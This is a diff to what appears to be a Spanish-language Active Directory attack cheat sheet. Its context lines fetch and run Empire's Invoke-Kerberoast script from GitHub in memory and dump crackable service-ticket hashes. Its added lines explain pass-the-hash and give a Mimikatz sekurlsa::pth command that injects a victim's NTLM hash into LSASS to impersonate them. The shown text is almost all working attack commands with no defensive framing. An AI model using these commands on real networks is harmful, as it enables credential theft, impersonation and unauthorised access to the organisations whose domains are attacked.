@@ -233,3 +233,10 @@ Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 `
+
+
+**PASS THE HASH**
+
+*Una vez que tenga el hash de la víctima , puede usarlo para hacerse pasar por ella. Debe usar una herramienta que realice la autenticación NTLM usando ese hash , o puede crear un nuevo inicio de sesión e inyectar ese hash dentro del LSASS , de modo que cuando se realice cualquier autenticación NTLM , se usará ese hash.*
+
+`Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.htb /ntlm:NTLMhash /run:powershell.exe"' ` # Usamos mimikatz en la maquina victima, este ataque tambien se puede efectuar con usuarios del ordenador, no solo del dominio.
